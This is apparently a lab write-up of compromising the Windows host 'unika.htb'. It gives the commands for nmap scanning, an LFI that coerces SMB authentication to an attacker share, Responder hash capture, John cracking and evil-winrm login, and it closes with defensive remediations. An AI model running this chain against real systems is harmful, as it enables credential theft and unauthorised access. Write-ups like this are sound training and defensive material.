## Phase 1: Reconnaissance

An initial network scan was conducted to identify open ports and running services on the target.

nmap -sV -sC <TARGET_IP>


**Key Findings:**

* **Port 80 (HTTP):** Apache web server running. The page redirects to `unika.htb`.
* **Port 5985 (HTTP):** Windows Remote Management (WinRM) service is active.

The domain `unika.htb` was added to the local `/etc/hosts` file to enable web access.


## Phase 2: Vulnerability Discovery & Exploitation (LFI to SMB Coercion)

Navigating the website on Port 80 revealed a language selection feature. Inspecting the URL showed that the page was loading local files via a `page` parameter:
`[http://unika.htb/index.php?page=french.html](http://unika.htb/index.php?page=french.html)`

This indicated a potential **Local File Inclusion (LFI)** vulnerability. Instead of including a local file, the parameter was manipulated to point to an attacker-controlled SMB share (a UNC path).

Simultaneously, the `Responder` tool was started on the local attacker machine to listen for incoming SMB authentication requests.

sudo responder -I tun0


The web application's URL was then modified to force the server to attempt authentication with the attacker machine:
`[http://unika.htb/index.php?page=//10.10.14.X/somefile](http://unika.htb/index.php?page=//10.10.14.X/somefile)`

**Result:** The Windows server attempted to authenticate to the rogue SMB share, and `Responder` successfully captured the `Administrator` user's NTLMv2 hash.


## Phase 3: Credential Cracking

The captured NTLMv2 hash was saved to a local file (`hash`). An offline dictionary attack was performed using John the Ripper and the `rockyou.txt` wordlist.

john --wordlist=rockyou.txt hash


**Result:** The hash was successfully cracked, revealing the Administrator password:

* **Username:** Administrator
* **Password:** badminton


## Phase 4: Remote Access & Post-Exploitation

With valid administrative credentials and knowledge that Port 5985 (WinRM) was open, a remote PowerShell session was established using `evil-winrm`.

evil-winrm -i <TARGET_IP> -u Administrator -p badminton


Once authenticated, standard file system enumeration was performed. The `Administrator` desktop was found to be empty. Further enumeration of the `C:\Users` directory revealed a secondary user profile (`mike`).

The flag was located and read from Mike's desktop:

cd C:\Users\mike\Desktop
type flag.txt


**Compromise Complete.**


## Remediation & Defensive Recommendations

To secure this environment against similar attack chains, the following mitigations should be implemented:

1. **Input Sanitization:** The web application must strictly validate and sanitize user input provided to the `page` parameter to prevent Local/Remote File Inclusion. Implement an allowlist of permitted files.
2. **Outbound Traffic Filtering:** Restrict outbound SMB traffic (Ports 139 and 445) at the firewall. Web servers should not be permitted to initiate SMB connections to arbitrary external IP addresses.
3. **Password Complexity:** Enforce strong password policies. The password `badminton` is weak and easily crackable using standard offline dictionary attacks.
4. **SMB Signing:** Enforce SMB signing across the network to prevent NTLM relay and coercion attacks.